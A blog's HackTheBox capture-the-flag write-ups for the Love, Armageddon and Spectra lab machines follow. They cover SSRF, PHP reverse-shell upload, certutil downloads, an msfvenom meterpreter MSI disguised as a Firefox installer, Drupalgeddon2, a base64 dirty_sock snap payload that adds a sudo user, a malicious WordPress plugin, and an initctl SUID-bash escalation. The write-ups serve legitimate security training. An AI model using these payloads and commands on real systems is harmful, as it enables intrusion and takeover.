[{"categories":["posts"],"content":"Overview Machine: https://www.hackthebox.eu/home/machines/profile/344 Love is an easy HackTheBox Windows machine created by pwnmeow (https://www.hackthebox.eu/home/users/profile/157669). We begin by exploiting an SSRF vulnerability on a web page found from the certificate information leak, letting us view a webpage, accessible only from localhost. From there we exploit the AlwaysInstallElevated Windows feature in order to install a malicious .msi package, that will grant us System privileges.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning all ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  nmap -sC -sV -p- 10.10.10.239 -oA Love Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 06:09 EDT Nmap scan report for 10.10.10.239 Host is up (0.080s latency). Not shown: 65516 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after: 2024-04-10T14:39:19 |_ssl-date: 2021-08-03T10:44:06+00:00; +29m16s from scanner time. | tls-alpn: |_ http/1.1 7680/tcp open pando-pub? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h14m16s, deviation: 3h30m01s, median: 29m15s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-08-03T03:43:53-07:00 | smb-security-mode: | account_used: \u003cblank\u003e | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-08-03T10:43:51 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 328.65 seconds   Flags used:  -sC: Scan with the default scripts -sV: Probe open ports to determine service/version info. -p-: Scan the entire port range. -oA: Save the nmap output on the designated file in all available formats.   Methodology From this machine’s nmap output, it could be easy to get lost since a lot of ports are open. That is because more ports open generally mean more opportunities for exploitation. However it could also mean more false positives that could end up wasting our time. Especially in the context of HackTheBox boxes, so many ports on an easy machine definitely mean that they are there to just confuse us. What we should be doing is take it step by step, starting by the HTTP/HTTPS servers. These are on ports 80, 443, 5000. In our case only port 80 and 443 are going to give us the info we need to continue, since the server on port 5000 forbids us from accessing it:\n Port 80/443 Navigating to the http://10.10.10.239 we get the following:\nThis appears to be a voting system that requires valid credentials in order to log in. Something to note is that it uses php, something we can confirm from the Wappalyzer Firefox plugin, the server’s title or if we visit http://10.10.10.239/index.php. We also start our gobuster with:\n1  gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php   The -x argument is going to help us identify files and not only folders on the server. Our file choice can vary, however we only search for .txt and .php files since we identified that the server uses php. Looking at it’s results, we see that a /admin folder exists. Visiting http://10.10.10.239/admin/ we see the following:\nWhile similar to the previous login page, this appears to be the page that the admin is going to log in from, while the previous was just for the voters. At this point we have no credentials, no further findings from gobuster and no other vulnerability identified whatsoever, so we move on to port 443. Visiting https://10.10.10.239 we get the following:\nWhile we can’t view the page, since this is HTTPS, we can view the certificate in order to identify any leaked information. Clicking at the top left of the page and selecting to view the certificate we get the following information:\nThis is very valuable information for us since we get the following:\n An email address as well as a username. The domain of the target. A subdomain that may provide us with a new page.  It should be noted that the nmap scan had already identified for us the domain name as well the subdomain on the port 443 results, using the same method we did (inspecting the certificate), however it is good practice to manually test things, so it was showcased here. Since we have learned that the target’s domain is love.htb and that the subdomain staging.love.htb also exists, we are going to enter them on our /etc/hosts file:\nVisiting http://love.htb directs us to the already seen voting system page. However, visiting http://staging.love.htb page directs us to a new page:\nThis appears to be used as a page used to scan visitor’s files for recognized malware signatures. It seems that it is still in beta testing and we can not sign up for it, however we can try it by clicking on the “Demo” link on the top left:\nHere we have to enter the URL of a file and it will scan it for us. To test it, we will start a simple python server on our machine and try to scan a file on our machine. In this case i will scan the nmap output file:\nFurther testing this, we try to scan the target itself:\nAt this point we know we can request resources. The next step would be to test the same thing, but by using the localhost IP address:\nThis also works! This points to an SSRF vulnerability. Since we were able to read the http://10.10.10.239/ page from the tool, what we could try to do is to read the page hosted on the other open port we found earlier. On port 5000 we had a “Forbidden” error. Scanning the following URL through the tool:\n http://10.10.10.239:5000  brought the same results (Forbidden). However since we identified an SSRF vulnerability, maybe the following scan will have different results:\n http://127.0.0.1:5000  Indeed, scanning http://127.0.0.1:5000, no longer brings the forbidden error and instead brings the following:\nWhile this is quite an unrealistic way to obtain credentials, it is a very good example to show how SSRF let us read something we were forbidden to.\nSince we now have admin credentials, as well as the admin page we previously found on http://10.10.10.239/admin/ we can now log in:\n Getting a shell as phoebe In General when we log in to platforms like this, what we want to look for, is any way that we can upload files and maybe execute them. What we know about this particular server is that it uses php, so if we manage to upload and execute php we have our shell. Clicking around the plattform’s categories seems to bring no interesting results. When we try all the links, what is left is the “Update Profile” feature:\nClicking on it, we get the following page, where we can change various information of the user:\nHaving in mind what we said earlier about being able to upload files, the interesting choice here is obvious. First things first we try uploading an actual image to see if and how this works. Our test image will be a .png file randomly found on the internet:\nUploading and saving our change seems to be sucessful!:\nSince we can upload files, we now have two missions:\n Find where the server saves this image. Try to upload a .php file instead of an image file and execute it from the path we identified from the previous step.  The first mission is quite easy, since we can just right click on the profile image and select “View Image\":\nIt is clear here based on the URL, that the server saves any uploaded image to the /image path.\nTo succeed in the second mission we will try to upload a .php reverse shell. What we may encounter in general, are upload filters, however, as we will see, there are no filters in this particular box. The shell we are going to upload is found here (of course you can experiment with any shell found online, since there are many of them):\n https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php  After editing the php file to fill our own IP and port we want to listen to, uploading it and saving our changes, we get a success:\nThe last step would be to see if our shell is functional by visiting the /images/reverse_shell.php path. Before that we should of course start our listener:\n1  rlwrap nc -nvlp 9001   As you noticed we used rlwrap. The reason is this is a windows machine and it will be hard creating an interactive shell the way we would on a linux target. rlwrap (https://github.com/hanslub42/rlwrap) helps us making the shell somewhat interactive. Visiting 10.10.10.239/images/reverse.php we get a shell:\n Privilege Escalation Since we are now in the box, firing up winpeas (https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) is a perfect start to identify any vulnerability, so we transfer it to the target by using certutil.exe after hosting it on a Python 3 simple server on our box:\n1 2 3 4 5  cd \\ mkdir temp cd temp certutil -urlcache -f \"http://10.10.14.3/winpeas.exe\" winpeas.exe .\\winpeas.exe   One of the advantages of winpeas, is that it will color code it’s findings based on severity. After scrolling a bit we see the following, color coded with red (an interesting find):\nIt appears that the two above registry values of AlwaysInstallElevated are set to 1. With a simple search about this we learn that we can use the AlwaysInstallElevated policy to install a Windows Installer Package (.msi files) with elevated (system) privileges. According to Microsoft, this option is equivalent to granting full administrative rights, which can pose a massive security risk. By setting the following registry values:\n HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer  to 1 (which we already have here) we are able to install .msi files with System privileges.\nAt this point it is pretty clear what we have to do. We will create a malicious .msi file, transfer it to the victim and execute it, in order to get an elevated shell. The tool we are going to use is of course msfvenom, and our payload of choice will be a meterpreter reverse tcp:\n1  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=9002 -f msi \u003e \"Firefox_Setup.msi\"   On the output we can just select a random name that will not raise suspicions. A Firefox setup package name will do the job just fine. Next step is hosting the malicious file and transfering it to the target:\n1  certutil -urlcache -f \"http://10.10.14.3/Firefox_Setup.msi\" Firefox_Setup.msi   Before exeuting the file we of course need to start listening on port 9002 that we specified. We will open a handler on Metasploit, select the correct payload, and start listening:\n1 2 3 4 5 6  msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.3 set lport 9002 run   Last step is executing the malicious file. To install it, we are going to use msiexec since we want full control over the installation process:\n1  msiexec /quiet /qn /i Firefox_Setup.msi   The options used here are:\n /quiet: This will suppress any messages during installation leading to a more clean output and requiring no user interaction. /qn: Specifies there’s no UI during the installation process. /i: Specifies normal installation instead of an administrative one.  After running the executable, we immediately get a meterpreter shell back as SYSTEM:\nUseful Resources  https://blog.sqreen.com/ssrf-explained/: SSRF Explained https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf: More SSRF stuff including a cheatsheet. https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/: AlwaysInstallElevated Tested  ","description":"","tags":null,"title":"Love Writeup (HackTheBox)","uri":"/posts/writeups/love/"},{"categories":["posts"],"content":"Armageddon Writeup (HackTheBox) Overview Machine: https://www.hackthebox.eu/home/machines/profile/323 Armageddon is an Easy HackTheBox machine created by bertolis ( HTB Profile: https://www.hackthebox.eu/home/users/profile/27897). We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box. From there, the database credentials used by Drupal are discovered, letting us connect to the mysql database and get another user’s credentials. We later discover this user can install snap packages with sudo. Exploiting this, we create a new user on the system by installing a custom .snap file. The new user has the permission to run everything with sudo, giving us the ability to change to the root user.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning the default ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  nmap -sC -sV 10.10.10.233 -oA armageddon Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 04:49 EDT Nmap scan report for 10.10.10.233 Host is up (0.089s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds   Flags used:  -sC: Scan with the default scripts -sV: Probe open ports to determine service/version info. -oN: Save the nmap output on the designated file in normal format.   Port 80 From our initial nmap scan we can see that an HTTP server is running on port 80. By visiting the page we see the following:\nBy using the Wappalyzer addon for firefox (which we can get here: https://addons.mozilla.org/el/firefox/addon/wappalyzer/) we can see right away, that the server is using Drupal version 7, which is a free and open-source Content Management System (CMS). In case we did not have the wappalyzer addon we could still identify that this is a Drupal installation from the page source:\nAt this point, we could try some default credentials or try brute forcing our way in (of course this could potentially lock out a user or/and blacklist our IP so always use with caution). We could also create a new user and try to log in. Since these paths did not appear to work, the next step is to search about Drupal version 7, in order to possibly identify any vulnerability/exploit. Simply searching for “Drupal 7 exploit” returns a lot of results. The very first interesting result appears to be the known Drupalgeddon2 exploit (https://github.com/dreadlocked/Drupalgeddon2). If we ignore the fact that the box’s name is Armageddon (kinda sounds like Drupalgeddon) which pushes us to believe that it is the right exploit, we would try this exploit anyway since it seems to affect the following versions:\n Drupal \u003c 8.3.9 / \u003c 8.4.6 / \u003c 8.5.1 Drupal \u003c 7.58  which includes our version.\n Getting a shell as apache The exploit we found out is already included in the Metasploit Framework and we are gonna use it from there. Searching for “Drupal” we can find it pretty easily:\nThe process of the exploitation is pretty straightforward at this point. After selecting the correct exploit from our search we are going to:\n set rhosts 10.10.10.233: Declare our target. set lhost tun0: Set our tun0 interface in order for the reverse shell to connect to the right IP. run: run the exploit  We now have a meterpreter shell as the apache user.\n Escalating privileges to the user brucetherealadmin Since we got a shell as apache, which is a not very privileged user, we will need to escalate our privileges to a normal user. Simply using ls -la we can see that we can read the server files, including the Drupal installation files:\nIt should be mentioned here that in order for Drupal to work, you have to tell Drupal where it will find the database, what the name of the database is, and what are the database credentials in order to access it. All these information are stored in a file called settings.php. Since we can read the Drupal installation files as the apache user, we can also read this file. Even if we do not know the exact location of this file, a simple Google search for “drupal credentials file” can do the job (https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored). From this Drupal forum we can see that the file we want is located at /sites/default/settings.php, which we of cource have access to. Reading the file we can start searching for the database credentials stored inside it:\nWe now have a set of credentials for the mysql database. We can also verify that the target does indeed listen to the mysql port:\nThis means we can log in mysql to possibly find more credentials. Since we already know from the file that we have the database’s name is drupal we are going to run the following in order to see the tables in it (password reducted):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  mysql -u drupaluser -*************** -D drupal -e 'show tables;' Tables_in_drupal actions authmap batch block block_custom block_node_type block_role blocked_ips cache cache_block cache_bootstrap cache_field cache_filter cache_form cache_image cache_menu cache_page cache_path comment date_format_locale date_format_type date_formats field_config field_config_instance field_data_body field_data_comment_body field_data_field_image field_data_field_tags field_revision_body field_revision_comment_body field_revision_field_image field_revision_field_tags file_managed file_usage filter filter_format flood history image_effects image_styles menu_custom menu_links menu_router node node_access node_comment_statistics node_revision node_type queue rdf_mapping registry registry_file role role_permission search_dataset search_index search_node_links search_total semaphore sequences sessions shortcut_set shortcut_set_users system taxonomy_index taxonomy_term_data taxonomy_term_hierarchy taxonomy_vocabulary url_alias users users_roles variable watchdog   Arguments Used:  -u: The user we are going to log in as. This is followed by a - and the password. -D: The database we are going to use. -e: Execute the statement and quit.  From all these tables, the users table is the most promising one (very common table to contain user credentials) so we are going to read it’s contents by using the following command (password reducted):\n1  mysql -u drupaluser -*************** -D drupal -e 'select * from users;'   Since the output is a little crowded, we can select only the columns that mater for each user (password reducted):\n1  mysql -u drupaluser -*************** -D drupal -e 'select name,pass from users;'   As a side note, the user Doomdesire is a user that we previously attempted to create on the initial login page. From here we get the username brucetherealadmin as well as a hash, that we are of course going to crack. To crack the hash we are going to use JohnTheRipper:\n1  john hash --wordlist=/usr/share/wordlists/rockyou.txt   Since we have now cracked the hash, we have a valid pair of credentials and log in as the user brucetherealadmin via ssh:\nWe have now logged in as the user brucetherealadmin.\n Escalating Privileges to root As with many other boxes, the very first thing to check, is if the user can run anything with sudo:\nIt seems we can run /usr/bin/snap install * with root privileges. Reading from the Snap page, “Snaps are cross-distribution, dependency-free, and easy to install applications packaged with all their dependencies to run on all major Linux distributions. As the current user it appears we can install .snap files.\nSearching for any vulnerability online, we get across this exploit https://github.com/initstring/dirty_sock. while this particular exploit is not the one we want to use here, it can help us, because it uses a payload that is in fact a malicious snap package. Reading the exploit “dirty_sockv2.py” from the github page we see that it includes a base64 encoded string:\nwith the following description: The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.\nFrom the above we can conclude that this is the .snap file we want. If we can install it we will have our new user created on the box. In order to create the snap file we are going to use python2 (there are other ways to create it). We are going to use the python print funcion in order to print the base64 string and then this output is going to be piped to the base64 decoder and and then right into a .snap file. Something to point out here is that we are going to have to replace the single quotes of the github base64 string with double quotes. This is required because the single quote is going to be used for the python2 -c argument:\n1  python2 -c 'print \"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\" + \"A\" * 4256 + \"==\"' | base64 -d \u003e Doomdesire.snap   We now have our .snap file:\nWe can also read the file in order to get a general idea of how it is going to work:\nWe can see that it is indeed going to add a new user called dirty_sock and add him to the sudoers group with the permissions to run every command with sudo.\nThe last step to exploit this, is to install our newly created .snap file:\n1  sudo /usr/bin/snap install --devmode Doomdesire.snap   A very important thing to note here, is that the --devmode is required for this to work. As we can read from the article describing this vulnerability that is linked on the end of this writeup, snaps themselves run in sandboxes and require digital signatures matching public keys that machines already trust. However, it is possible to lower these restrictions by indicating that a snap is in development (called “devmode”). This will give the snap access to the host Operating System just as any other application would have. Now that we installed our snap, the exploit has completed and we have a new user on the box. The user’s credentials are the following:\n Username: dirty_sock Password: dirty_sock  Since the user can run anything with sudo, we simply changed to the root user with sudo su\nUseful Resources:  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html: Dirty_Sock Explained. https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/: Drupalgeddon2 Explained. https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory: Info about the settings.php file of Drupal.  ","description":"","tags":null,"title":"Armageddon Writeup (HackTheBox)","uri":"/posts/writeups/armageddon/"},{"categories":["posts"],"content":"Overview Machine: https://www.hackthebox.eu/home/machines/profile/317\nSpectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www.hackthebox.eu/home/users/profile/1190). We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning the default ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  nmap -sC -sV 10.10.10.229 -oN spectra.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 15:16 EDT Nmap scan report for 10.10.10.229 Host is up (0.081s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn't have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 41.19 seconds   Flags used:  -sC: Scan with the default scripts -sV: Probe open ports to determine service/version info. -oN: Save the nmap output on the designated file in normal format.  Web Server From the nmap scan we can see that an HTTP server is hosted on port 80. HTTP servers are generally the right path to start enumerating so we visit the page: The server appears to be used for issue tracking. By clicking around the page we see the following: This means the server tries to reach spectra.htb, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map spectra.htb to 10.10.10.229 which is our target’s IP. We can do that with nano /etc/hosts: First Link (Wordpress Site) By saving the hosts file, we can now navigate the pages. By clicking on the Software Issue Tracker link now correctly redirects us to the following page: Some instant information we can gather is that this is a Wordpress site and that administrator is a username we can later user in case we want to get access to it. By clicking on the Log in link (bottom right), we get to the Wordpress login page: There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username doomdesire and a random password i get the following error: However, trying to login as administrator and a random password i get the following error: which is clearly a different message from the previous one, confirming that administrator is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not. At this point there were some things we could try in order to maybe login such as:\n Since this is a wordpress site, it’s a very good idea to run wpscan which is a wordpress enumeration tool found here: https://github.com/wpscanteam/wpscan Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution). We could use CeWL (https://github.com/digininja/CeWL) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).  These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.\n Second Link (Test) Apart from the Software Issue Tracker link, there was also a Test link on the initial page, that redirects us to http://spectra.htb/testing/index.php that returns us an Error establishing a database connection message. However, index.php is not the only file hosted on /testing, something that can be easily confirmed by visiting http://spectra.htb/testing/ : There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words “config” and “login” should be the first to read. Checking the wp-config.php.save file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments: including MySQL credentials! Note that Instead of viewing the page source we could also use curl http://spectra.htb/testing/wp-config.php.save from our terminal and we would also be able to view it.\n Accessing the Wordpress Administrator Panel We now have a password and including the newly found username devtest we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the devstest username brings no results, however, trying with the administrator username get’s us right in: Some instant information we can get is that Wordpress is out-of-date and that our version is 5.4.2. Of course we could have known this right from the start by looking for example at the page source of the login page: or by using the firefox extension “Wappalyzer\": The version can also be found by the previously mentioned wpscan tool.\n Getting a shell as nginx Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: https://github.com/wetw0rk/malicious-wordpress-plugin. It’s usage is pretty straightforward. We are gonna run:\n1 2  chmod +x wordpwn.py ./wordpwn.py 10.10.14.9 4444 Y   This will first make the script executable, then create file called “malicious.zip” that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The Y option declares that we want to automatically start a handler with metasploit: As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to Plugins--\u003eAdd New--\u003eUpload Plugin--\u003eBrowse and select the malicious.zip file we generated with the script. We then select Install Now and then Activate Plugin: As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the /main part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):\n http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php  and we get a reverse shell:\n Escalating Privileges to Katie At first glance we can see there is another user on the box named Katie:\n1  cat /etc/passwd | grep \"/bin/bash\"   If we want to get the user.txt we have to escalate our privileges to that user. If we are going to avoid automated tools such as LinPeas, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:\n1  find / -name *.conf* 2\u003e /dev/null   This will search for all files on the system that contain the .conf part on their name. However running this will create a lot of noise from some folders such as /etc, /mnt and /usr so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too. To filter them out we run:\n1  find / -name *.conf* 2\u003e /dev/null | grep -v -e \"/etc/\" -e \"/mnt/\" -e \"/usr\"   We notice a file named /opt/autologin.conf.orig. Reading it, we see there is a password file on a folder named autologin inside /etc. Remember that we filtered out this folder! We could have easily missed it! Reading the passwd file inside /etc/autologin/ we get a password: The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!  Escalating Privileges to root Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as LinPeas, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:\n1  sudo -l   This will list all the binaries Katie can run with sudo: We see that we can run initctl as root. As stated on it’s man page, initctl allows a system administrator to communicate and interact with the Upstart. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:\n Create a new job by writing a new configuration file (.conf). Edit an already existing one.  The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can’t edit all files, however we have the rights to edit some of the files in there. Great! Below we can see what a job configuration file looks like: Notice the part between “script” and “end script”. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let’s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the test.conf file with nano: Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute sudo +s /bin/bash as the root user. We can confirm it worked by executing /bin/bash with the -p flag. The -p flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job: We are root!\nResources A good place to learn about Upstart and initctl: https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it\n","description":"","tags":null,"title":"Spectra Writeup (HackTheBox)","uri":"/posts/writeups/spectra/"}]
